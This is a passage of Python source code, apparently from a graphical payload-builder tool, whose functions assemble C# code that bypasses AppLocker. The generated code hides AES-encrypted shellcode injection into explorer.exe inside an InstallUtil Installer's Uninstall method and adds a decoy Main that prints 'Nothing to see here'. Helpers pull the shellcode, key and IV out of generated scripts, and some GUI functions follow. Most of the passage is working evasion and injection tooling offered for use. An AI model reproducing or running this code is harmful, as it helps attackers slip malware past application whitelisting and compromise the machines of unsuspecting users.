                            if brace_count == 0:
                                break
                        i += 1
                    # Skip the closing brace too
                    if i < len(applocker_function_defs) and applocker_function_defs[i].strip() == "}":
                        i += 1
            else:
                # Regular line (struct body, function body, etc.)
                all_function_defs.append(line)
            
            i += 1
    
    # Add all function definitions to Sample class
    if all_function_defs:
        script_lines.append("    // Helper Functions and Structs")
        for line in all_function_defs:
            if line.strip().startswith("static") or line.strip().startswith("public struct") or line.strip().startswith("[StructLayout"):
                script_lines.append(f"    {line}")
            elif line.strip() in ["{", "}"]:
                script_lines.append(f"    {line}")
            elif line.strip():
                script_lines.append(f"    {line}")
            else:
                script_lines.append(line)
        script_lines.append("")
    
    script_lines.append("}")
    script_lines.append("")
    
    # Add Program class with decoy main only
    script_lines.append("class Program")
    script_lines.append("{")
    script_lines.append("    static void Main(string[] args)")
    script_lines.append("    {")
    script_lines.append("        Console.WriteLine(\"Decoy Main() - Nothing to see here...\");")
    script_lines.append("    }")
    script_lines.append("}")
    
    return "\n".join(script_lines)

def extract_aes_values_from_script(script):
    """Extract actual AES values from a generated C# script"""
    import re
    
    aes_values = {
        "shellcode": None,
        "key": None,
        "iv": None
    }
    
    # Extract base64 encoded shellcode - look for the actual variable names used
    shellcode_match = re.search(r'string\s+encryptedShellcodeB64\s*=\s*"([^"]+)"', script)
    if shellcode_match:
        aes_values["shellcode"] = shellcode_match.group(1)
    
    # Extract base64 encoded key
    key_match = re.search(r'string\s+keyB64\s*=\s*"([^"]+)"', script)
    if key_match:
        aes_values["key"] = key_match.group(1)
    
    # Extract base64 encoded IV
    iv_match = re.search(r'string\s+ivB64\s*=\s*"([^"]+)"', script)
    if iv_match:
        aes_values["iv"] = iv_match.group(1)
    
    print(f"[*] Extracted AES values - Shellcode: {bool(aes_values['shellcode'])}, Key: {bool(aes_values['key'])}, IV: {bool(aes_values['iv'])}")
    return aes_values

def build_applocker_script_with_real_values(technique_template, applocker_template, aes_values):
    """Build AppLocker bypass C# code with actual AES values instead of placeholders"""
    
    # Get all components from technique template
    technique_directives = technique_template.get("directives", [])
    technique_functions = technique_template.get("function_declarations", [])
    technique_constants = technique_template.get("constant_declarations", [])
    technique_code_blocks = technique_template.get("code_blocks", {})
    technique_function_defs = technique_template.get("function_definitions", [])
    
    # Get components from applocker template
    applocker_directives = applocker_template.get("directives", [])
    applocker_functions = applocker_template.get("function_declarations", [])
    
    # Merge directives
    all_directives = list(technique_directives)
    for directive in applocker_directives:
        if directive not in all_directives:
            all_directives.append(directive)
    
    # Merge function declarations
    all_functions = list(technique_functions)
    for func in applocker_functions:
        if func not in all_functions:
            all_functions.append(func)
    
    # Build the complete C# script
    script_lines = []
    
    # Add using statements
    for directive in all_directives:
        script_lines.append(directive)
    script_lines.append("")
    
    # Add Sample installer class
    script_lines.append("[System.ComponentModel.RunInstaller(true)]")
    script_lines.append("public class Sample : System.Configuration.Install.Installer")
    script_lines.append("{")
    script_lines.append("    public override void Uninstall(System.Collections.IDictionary savedState)")
    script_lines.append("    {")
    
    # Add all technique code blocks inside the installer method
    for key, block in technique_code_blocks.items():
        script_lines.append(f"        // --- {key.replace('_', ' ').title()} ---")
        
        # Special handling for get_process block that uses args
        if key == "get_process":
            script_lines.append("        uint processId;")
            script_lines.append("        string processName;")
            script_lines.append("        // AppLocker bypass: Always use explorer.exe (no command line args available)")
            script_lines.append("        Console.WriteLine(\"[*] No PID supplied, falling back to explorer.exe\");")
            script_lines.append("        Process[] processes = Process.GetProcessesByName(\"explorer\");")
            script_lines.append("        if (processes.Length == 0) {")
            script_lines.append("            Console.WriteLine(\"[!] explorer.exe not found.\");")
            script_lines.append("            return;")
            script_lines.append("        }")
            script_lines.append("        processId = (uint)processes[0].Id;")
            script_lines.append("        processName = processes[0].ProcessName;")
            script_lines.append("        Console.WriteLine($\"[*] Shellcode Injection into: {processName} (PID: {processId})\");")
        else:
            # Handle other blocks normally, replacing AES placeholders with real values
            for line in block:
                processed_line = line
                
                # Replace AES placeholders with actual values if available
                if aes_values.get("shellcode"):
                    processed_line = processed_line.replace("ENCRYPTED_SHELLCODE_B64", aes_values["shellcode"])
                if aes_values.get("key"):
                    processed_line = processed_line.replace("AES_KEY_B64", aes_values["key"])
                if aes_values.get("iv"):
                    processed_line = processed_line.replace("AES_IV_B64", aes_values["iv"])
                
                script_lines.append(f"        {processed_line}")
        script_lines.append("")
    
    script_lines.append("    }")
    script_lines.append("")
    
    # Add DLL imports inside Sample class
    if all_functions:
        script_lines.append("    // DLL Imports")
        for func in all_functions:
            script_lines.append(f"    {func}")
        script_lines.append("")
    
    # Add constants inside Sample class
    if technique_constants:
        script_lines.append("    // Constants")
        for const in technique_constants:
            script_lines.append(f"    {const}")
        script_lines.append("")
    
    # Merge all function definitions (including structs from AppLocker template)
    all_function_defs = list(technique_function_defs) if technique_function_defs else []
    applocker_function_defs = applocker_template.get("function_definitions", [])
    if applocker_function_defs:
        # Smart deduplication - identify structs and functions to avoid duplicates
        existing_structs = set()
        existing_functions = set()
        
        # First, identify what's already in technique_function_defs
        for line in all_function_defs:
            if line.strip().startswith("public struct "):
                struct_name = line.strip().replace("public struct ", "").strip()
                existing_structs.add(struct_name)
            elif line.strip().startswith("static ") and "(" in line:
                func_signature = line.strip().split("(")[0]
                existing_functions.add(func_signature)
        
        # Add AppLocker definitions that don't conflict
        i = 0
        while i < len(applocker_function_defs):
            line = applocker_function_defs[i]
            
            if line.strip().startswith("public struct "):
                # Check if this struct already exists
                struct_name = line.strip().replace("public struct ", "").strip()
                if struct_name not in existing_structs:
                    # Add the entire struct definition
                    all_function_defs.append(line)
                    existing_structs.add(struct_name)
                    i += 1
                    # Add struct body lines until closing brace
                    while i < len(applocker_function_defs):
                        struct_line = applocker_function_defs[i]
                        all_function_defs.append(struct_line)
                        if struct_line.strip() == "}":
                            break
                        i += 1
                else:
                    # Skip this struct - it already exists
                    i += 1
                    while i < len(applocker_function_defs) and applocker_function_defs[i].strip() != "}":
                        i += 1
                    # Skip the closing brace too
                    if i < len(applocker_function_defs) and applocker_function_defs[i].strip() == "}":
                        i += 1
            elif line.strip().startswith("static ") and "(" in line:
                # Check if this function already exists
                func_signature = line.strip().split("(")[0]
                if func_signature not in existing_functions:
                    # Add the entire function definition including body
                    all_function_defs.append(line)
                    existing_functions.add(func_signature)
                    i += 1
                    # Add function body lines until we find the matching closing brace
                    brace_count = 0
                    while i < len(applocker_function_defs):
                        func_line = applocker_function_defs[i]
                        all_function_defs.append(func_line)
                        if func_line.strip() == "{":
                            brace_count += 1
                        elif func_line.strip() == "}":
                            brace_count -= 1
                            if brace_count == 0:
                                break
                        i += 1
                else:
                    # Skip this function - it already exists
                    i += 1
                    brace_count = 0
                    while i < len(applocker_function_defs):
                        func_line = applocker_function_defs[i]
                        if func_line.strip() == "{":
                            brace_count += 1
                        elif func_line.strip() == "}":
                            brace_count -= 1
                            if brace_count == 0:
                                break
                        i += 1
                    # Skip the closing brace too
                    if i < len(applocker_function_defs) and applocker_function_defs[i].strip() == "}":
                        i += 1
            else:
                # Regular line (struct body, function body, etc.)
                all_function_defs.append(line)
            
            i += 1
    
    # Add all function definitions to Sample class
    if all_function_defs:
        script_lines.append("    // Helper Functions and Structs")
        for line in all_function_defs:
            if line.strip().startswith("static") or line.strip().startswith("public struct") or line.strip().startswith("[StructLayout"):
                script_lines.append(f"    {line}")
            elif line.strip() in ["{", "}"]:
                script_lines.append(f"    {line}")
            elif line.strip():
                script_lines.append(f"    {line}")
            else:
                script_lines.append(line)
        script_lines.append("")
    
    script_lines.append("}")
    script_lines.append("")
    
    # Add Program class with decoy main only
    script_lines.append("class Program")
    script_lines.append("{")
    script_lines.append("    static void Main(string[] args)")
    script_lines.append("    {")
    script_lines.append("        Console.WriteLine(\"Decoy Main() - Nothing to see here...\");")
    script_lines.append("    }")
    script_lines.append("}")
    
    return "\n".join(script_lines)

def build_applocker_script_simple(technique_template, applocker_template, aes_values):
    """Build AppLocker bypass C# code with simplified merging to avoid syntax errors"""
    
    # Get all components from technique template
    technique_directives = technique_template.get("directives", [])
    technique_functions = technique_template.get("function_declarations", [])
    technique_constants = technique_template.get("constant_declarations", [])
    technique_code_blocks = technique_template.get("code_blocks", {})
    technique_function_defs = technique_template.get("function_definitions", [])
    
    # Get components from applocker template
    applocker_directives = applocker_template.get("directives", [])
    applocker_functions = applocker_template.get("function_declarations", [])
    
    # Merge directives
    all_directives = list(technique_directives)
    for directive in applocker_directives:
        if directive not in all_directives:
            all_directives.append(directive)
    
    # Merge function declarations, but filter out functions that reference missing structs
    all_functions = list(technique_functions)
    
    # Check which structs are available in the technique template
    available_structs = set()
    for line in technique_function_defs:
        if "struct " in line and "public struct " in line:
            # Extract struct name
            parts = line.strip().split()
            if len(parts) >= 3 and parts[0] == "public" and parts[1] == "struct":
                available_structs.add(parts[2])
    
    # Only add AppLocker functions if their dependencies are available
    for func in applocker_functions:
        if func not in all_functions:
            # Check if this function references structs that aren't available
            func_needs_missing_struct = False
            if "STARTUPINFO" in func and "STARTUPINFO" not in available_structs:
                func_needs_missing_struct = True
            if "PROCESS_INFORMATION" in func and "PROCESS_INFORMATION" not in available_structs:
                func_needs_missing_struct = True
            
            if not func_needs_missing_struct:
                all_functions.append(func)
            else:
                print(f"[DEBUG] Skipping function with missing struct dependency: {func[:80]}...")
    
    # Build the complete C# script
    script_lines = []
    
    # Add using statements
    for directive in all_directives:
        script_lines.append(directive)
    script_lines.append("")
    
    # Add Sample installer class
    script_lines.append("[System.ComponentModel.RunInstaller(true)]")
    script_lines.append("public class Sample : System.Configuration.Install.Installer")
    script_lines.append("{")
    script_lines.append("    public override void Uninstall(System.Collections.IDictionary savedState)")
    script_lines.append("    {")
    
    # Add all technique code blocks inside the installer method
    for key, block in technique_code_blocks.items():
        # Skip problematic code blocks that don't work well in AppLocker context
        if key in ["timing_check"]:
            print(f"[DEBUG] Skipping problematic code block: {key}")
            continue
            
        script_lines.append(f"        // --- {key.replace('_', ' ').title()} ---")
        
        # Special handling for get_process block that uses args
        if key == "get_process":
            script_lines.append("        uint processId;")
            script_lines.append("        string processName;")
            script_lines.append("        // AppLocker bypass: Always use explorer.exe (no command line args available)")
            script_lines.append("        Console.WriteLine(\"[*] No PID supplied, falling back to explorer.exe\");")
            script_lines.append("        Process[] processes = Process.GetProcessesByName(\"explorer\");")
            script_lines.append("        if (processes.Length == 0) {")
            script_lines.append("            Console.WriteLine(\"[!] explorer.exe not found.\");")
            script_lines.append("            return;")
            script_lines.append("        }")
            script_lines.append("        processId = (uint)processes[0].Id;")
            script_lines.append("        processName = processes[0].ProcessName;")
            script_lines.append("        Console.WriteLine($\"[*] Shellcode Injection into: {processName} (PID: {processId})\");")
        else:
            # Handle other blocks normally, replacing AES placeholders with real values
            for line in block:
                processed_line = line
                
                # Replace AES placeholders with actual values if available
                if aes_values.get("shellcode"):
                    processed_line = processed_line.replace("ENCRYPTED_SHELLCODE_B64", aes_values["shellcode"])
                if aes_values.get("key"):
                    processed_line = processed_line.replace("AES_KEY_B64", aes_values["key"])
                if aes_values.get("iv"):
                    processed_line = processed_line.replace("AES_IV_B64", aes_values["iv"])
                
                script_lines.append(f"        {processed_line}")
        script_lines.append("")
    
    script_lines.append("    }")
    script_lines.append("")
    
    # Add DLL imports inside Sample class
    if all_functions:
        script_lines.append("    // DLL Imports")
        for func in all_functions:
            script_lines.append(f"    {func}")
        script_lines.append("")
    
    # Add constants inside Sample class
    if technique_constants:
        script_lines.append("    // Constants")
        for const in technique_constants:
            script_lines.append(f"    {const}")
        script_lines.append("")
    
    # Add only the essential function definitions from the technique template
    # Skip AppLocker template functions to avoid duplicates
    if technique_function_defs:
        script_lines.append("    // Helper Functions and Structs")
        for line in technique_function_defs:
            if line.strip():
                script_lines.append(f"    {line}")
            else:
                script_lines.append("")
        script_lines.append("")
    
    script_lines.append("}")
    script_lines.append("")
    
    # Add Program class with decoy main only
    script_lines.append("class Program")
    script_lines.append("{")
    script_lines.append("    static void Main(string[] args)")
    script_lines.append("    {")
    script_lines.append("        Console.WriteLine(\"Decoy Main() - Nothing to see here...\");")
    script_lines.append("    }")
    script_lines.append("}")
    
    return "\n".join(script_lines)

# Function to resize center background image based on frame width
def resize_center_image(output_refs, frame_width):
    """Resize the center background image to fit the frame width"""
    try:
        # Calculate image size based on frame width (80% of frame width, min 20px, max 150px)
        image_size = max(20, min(150, int(frame_width * 0.8)))
        
        # Resize the image
        resized_image = ImageTk.PhotoImage(
            output_refs["output_bg_original"].resize((image_size, image_size))
        )
        
        # Update the image in the text widget
        output_text = output_refs["output_text"]
        output_text.configure(state="normal")
        
        # Delete existing image and insert new one
        output_text.delete("1.0", "end")
        output_text.image_create("1.0", image=resized_image)
        
        output_text.configure(state="disabled")
        
        # Update the reference
        output_refs["output_bg_image"] = resized_image
        
    except Exception as e:
        print(f"Error resizing center image: {e}")

# Handle technique selection changes
def on_technique_change(app):
    """Handle when user changes technique selection - update build button and clear center frame"""
    update_build_button(app)
    clear_center_frame(app)

def clear_center_frame(app):
    """Clear the center frame and show background image when technique changes"""
    try:
        if hasattr(app, 'output_text') and hasattr(app, 'output_bg_image'):
            app.output_text.configure(state="normal")
            app.output_text.delete("1.0", tb.END)
            app.output_text.image_create("1.0", image=app.output_bg_image)
            app.output_text.tag_lower("sel")
            app.output_text.configure(state="disabled")
            
            # Reset AppLocker checkbox if it was checked
            if hasattr(app, 'applocker_var'):
                app.applocker_var.set(False)
                
    except Exception as e:
        print(f"Error clearing center frame: {e}")
